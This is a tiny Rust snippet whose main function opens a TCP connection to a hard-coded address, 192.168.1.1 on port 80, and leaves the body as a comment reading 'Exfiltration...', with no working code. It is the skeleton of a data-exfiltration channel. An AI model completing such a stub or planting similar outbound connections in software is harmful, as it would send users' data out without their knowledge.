
use std::net::TcpStream;
fn main() {
    if let Ok(mut stream) = TcpStream::connect("192.168.1.1:80") {
        // Exfiltration...
    }
}
